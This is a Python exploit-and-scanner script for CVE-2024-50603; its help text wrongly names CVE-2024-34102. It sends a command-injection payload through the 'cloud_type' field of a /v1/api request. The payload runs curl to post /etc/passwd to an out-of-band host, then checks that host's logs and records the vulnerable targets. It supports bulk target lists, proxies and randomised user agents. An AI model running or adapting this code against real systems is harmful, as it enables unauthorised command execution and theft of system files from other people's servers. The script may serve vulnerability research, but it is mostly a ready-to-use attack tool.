import asyncio
import argparse
import aiofiles
from alive_progress import alive_bar
from fake_useragent import UserAgent
from colorama import Fore, Style
import ssl
import httpx
import random
import os
import json

green = Fore.GREEN
magenta = Fore.MAGENTA
cyan = Fore.CYAN
mixed = Fore.RED + Fore.BLUE
red = Fore.RED
blue = Fore.BLUE
yellow = Fore.YELLOW
white = Fore.WHITE
reset = Style.RESET_ALL
bold = Style.BRIGHT
colors = [ green, cyan, blue]
random_color = random.choice(colors)


def banner():
    banner=f"""{bold}{random_color}
  ____ __     __ _____  _   _                _               
 / ___|\ \   / /| ____|| | | | _   _  _ __  | |_   ___  _ __ 
| |     \ \ / / |  _|  | |_| || | | || '_ \ | __| / _ \| '__|
| |___   \ V /  | |___ |  _  || |_| || | | || |_ |  __/| |   
 \____|   \_/   |_____||_| |_| \__,_||_| |_| \__| \___||_| 
     CVE-2024-50603                  {bold}{white}@th3gokul & @th3sanjai{reset}\n"""
    return banner


print(banner())



parser = argparse.ArgumentParser(description=f"[{bold}{blue}Description{reset}]: {bold}{white}Vulnerability Detection and Exploitation  tool for CVE-2024-34102" , usage=argparse.SUPPRESS)
parser.add_argument("-u", "--url", type=str, help=f"[{bold}{blue}INF{reset}]: {bold}{white}Specify a URL or domain for vulnerability detection")
parser.add_argument("-l", "--list", type=str, help=f"[{bold}{blue}INF{reset}]: {bold}{white}Specify a list of URLs for vulnerability detection")
parser.add_argument("-t", "--threads", type=int, default=1, help=f"[{bold}{blue}INF{reset}]: {bold}{white}Number of threads for list of URLs")
parser.add_argument("-proxy", "--proxy", type=str, help=f"[{bold}{blue}INF{reset}]: {bold}{white}Proxy URL to send request via your proxy")
parser.add_argument("-v", "--verbose", action="store_true", help=f"[{bold}{blue}INF{reset}]: {bold}{white}Increases verbosity of output in console")
parser.add_argument("-o", "--output", type=str, help=f"[{bold}{blue}INF{reset}]: {bold}{white}Filename to save output of vulnerable target{reset}]")
parser.add_argument("-to", "--timeout", type=int, help=f"[{bold}{blue}INF{reset}]: {bold}{white}Specify a timeout value for the HTTP request{reset}")
args=parser.parse_args()

async def get_instance(session):
    try:
        base_url = f"https://api.cvssadvisor.com/ssrf/api/instance"
        headers = {
            "User-Agent": UserAgent().random,
            "Referer": "https://ssrf.cvssadvisor.com/",
            "Content-Type": "application/json",
            "Orgin": "https://ssrf.cvssadvisor.com"
        }
        
        response = await  session.request("POST", base_url,headers=headers, timeout=30, follow_redirects=True)
        responsed = response.text
        value = responsed.strip('"')
        return value
    except (httpx.ConnectError, httpx.RequestError, httpx.TimeoutException) as e:
        return 
    except ssl.SSLError as e:
        pass
    except httpx.InvalidURL:
        pass
    except KeyboardInterrupt :
        SystemExit
    except asyncio.CancelledError:
        SystemExit
    except Exception as e:
        if args.verbose:
            print(f"Exception in get-instance: {e}, {type(e)}")

async def delete_instance(session, instance_id):
    try:
        base_url = f"https://api.cvssadvisor.com/ssrf/api/instance/{instance_id}"
        headers = {
            "User-Agent": UserAgent().random,
            "Referer": "https://ssrf.cvssadvisor.com/",
            "Content-Type": "application/json",
            "Orgin": "https://ssrf.cvssadvisor.com"
        }
        
        response = await  session.request("DELETE", base_url,headers=headers, timeout=30, follow_redirects=True)
        if response.status_code == 200:
            pass
        
    except (httpx.ConnectError, httpx.RequestError, httpx.TimeoutException) as e:
        return 
    except ssl.SSLError as e:
        pass
    except httpx.InvalidURL:
        pass
    except KeyboardInterrupt :
        SystemExit
    except asyncio.CancelledError:
        SystemExit
    except Exception as e:
        if args.verbose:
            print(f"Exception in delete: {e}, {type(e)}")

async def instance_log(session, instance_id, url):
    try:
        base_url = f"https://api.cvssadvisor.com/ssrf/api/instance/{instance_id}"
        headers = {
            "User-Agent": UserAgent().random,
            "Referer": "https://ssrf.cvssadvisor.com/",
            "Content-Type": "application/json",
            "Orgin": "https://ssrf.cvssadvisor.com"
        }
        
        response = await  session.request("GET", base_url,headers=headers, timeout=30, follow_redirects=True)
        data = response.json()
        raw_data = json.dumps(data)
        
        if f"{url}" in raw_data:
            return "exploited"
        else:
            return "failed"
        
    except (httpx.ConnectError, httpx.RequestError, httpx.TimeoutException) as e:
        return 
    except ssl.SSLError as e:
        pass
    except httpx.InvalidURL:
        pass
    except KeyboardInterrupt :
        SystemExit
    except asyncio.CancelledError:
        SystemExit
    except Exception as e:
        if args.verbose:
            print(f"Exception in log: {e}, {type(e)}")

async def instance_clear(session, instance_id):
    try:
        base_url = f"https://api.cvssadvisor.com/ssrf/api/instance/{instance_id}/clear"
        headers = {
            "User-Agent": UserAgent().random,
            "Referer": "https://ssrf.cvssadvisor.com/",
            "Content-Type": "application/json",
            "Orgin": "https://ssrf.cvssadvisor.com"
        }
        
        response =  session.request("DELETE", base_url,headers=headers, timeout=30, follow_redirects=True) 
        if response.status_code == 200:
            pass
        
    except (httpx.ConnectError, httpx.RequestError, httpx.TimeoutException) as e:
        return 
    except ssl.SSLError as e:
        pass
    except httpx.InvalidURL:
        pass
    except KeyboardInterrupt :
        SystemExit
    except asyncio.CancelledError:
        SystemExit
    except Exception as e:
        if args.verbose:
            print(f"Exception in clear: {e}, {type(e)}")

async def save(result):
    try:
            if args.output:
                if os.path.isfile(args.output):
                    filename = args.output
                elif os.path.isdir(args.output):
                    filename = os.path.join(args.output, f"results.txt")
                else:
                    filename = args.output
            else:
                    filename = "results.txt"
            async with aiofiles.open(filename, "a") as w:
                    await w.write(result + '\n')
    except KeyboardInterrupt as e:        
        quit()
    except asyncio.CancelledError as e:
        SystemExit
    except Exception as e:
        pass


async def request(session,url,instance_url):
    try:
        base_url=f"{url}/v1/api"
        header={
            "User-Agent": UserAgent().random,
            "Content-Type": "application/x-www-form-urlencoded"
        }

        body = (
        "action=list_flightpath_destination_instances&"
        "CID=anything_goes_here&"
        "account_name=1&"
        "region=1&"
        "vpc_id_name=1&"
        f"cloud_type=1|$(curl%20-X%20POST%20-d%20@/etc/passwd%20{instance_url}/?url={url})"
    )
        
        response = await  session.request("POST", base_url, data=body, headers=header , follow_redirects=True)
    except (httpx.ConnectError, httpx.RequestError, httpx.TimeoutException) as e:
        return 
    except ssl.SSLError as e:
        pass
    except httpx.InvalidURL:
        pass
    except KeyboardInterrupt :
        SystemExit
    except asyncio.CancelledError:
        SystemExit
    except Exception as e:
        if args.verbose:
            print(f"Exception in request module: {e}, {type(e)}")



async def Exploit(session, url, instance_id, sem, bar):
    try:
        
        await request(session, url, f"https://{instance_id}.c5.rs")
        await asyncio.sleep(0.5)
        result = await instance_log(session, instance_id, url)
        
        if result == "exploited":
            print(f"[{bold}{green}VULN{reset}]: {bold}{white}{url}{reset}")
            await save(url)        
    except KeyboardInterrupt as e:
        SystemExit
    except asyncio.CancelledError as e:
        SystemExit   
    except Exception as e:
        if args.verbose:
            print(f"Exception in exploit: {e}, {type(e)}")
    finally:
        bar()
        sem.release()

async def loader(urls, session,instance_id, sem, bar):
    try:
        tasks = []
        for url in urls:
            await sem.acquire() 
            task = asyncio.ensure_future(Exploit(session, url,instance_id, sem, bar))
            tasks.append(task)
        await asyncio.gather(*tasks, return_exceptions=False)
    except KeyboardInterrupt as e:
        SystemExit
    except asyncio.CancelledError as e:
        SystemExit
    except Exception as e:
        if args.verbose:
            print(f"Exception in loader: {e}, {type(e)}")

async def setup(urls):
    try:
        urls = list(set(urls))
    
        sem = asyncio.Semaphore(args.threads)
        proxy = args.proxy if args.proxy else None
        timeout = httpx.Timeout(connect=args.timeout, pool=args.threads*2, write=None, read=80.0)
        limits = httpx.Limits(max_connections=args.threads, max_keepalive_connections=args.threads)
        async with httpx.AsyncClient(verify=False, proxy=proxy, timeout=timeout, limits=limits) as session:
            instance = await get_instance(session)
            if not instance :
                print(f"[{bold}{red}INFO{reset}]: {bold}{white}Unable to create a interactive SSRF server Please run again!{reset}")
                exit(1)
            with alive_bar(title=f"CVEHunter", total=len(urls), enrich_print=False) as bar:
                await loader(urls, session,instance, sem, bar)
                await delete_instance(session,instance)
    except RuntimeError as e:
        pass
    except KeyboardInterrupt as e:
        SystemExit
    except Exception as e:
        if args.verbose:
            print(f"Exception in threads: {e}, {type(e)}")


async def main():
    try:
        urls = []
        if args.url:
            if args.url.startswith("https://") or args.url.startswith("http://"):
                urls.append(args.url)
            else:
                new_url = f"https://{args.url}"
                urls.append(new_url)
                new_http = f"http://{args.url}"
                urls.append(new_http)
            await setup(urls)
                
        if args.list:
            async with aiofiles.open(args.list, "r") as streamr:
                async for url in streamr:
                    url = url.strip()
                    if url.startswith("https://") or url.startswith("http://"):
                        urls.append(url)
                    else:
                        new_url = f"https://{url}"
                        urls.append(new_url)
                        new_http = f"http://{url}"
                        urls.append(new_http)
            await setup(urls)

    except FileNotFoundError as e:
        print(f"[{bold}{red}WRN{reset}]: {bold}{white}{args.list} no such file or directory{reset}")
        SystemExit
        
    except Exception as e:
        print(f"Exception in main: {e}, {type(e)}")

if __name__ == "__main__":
    asyncio.run(main())
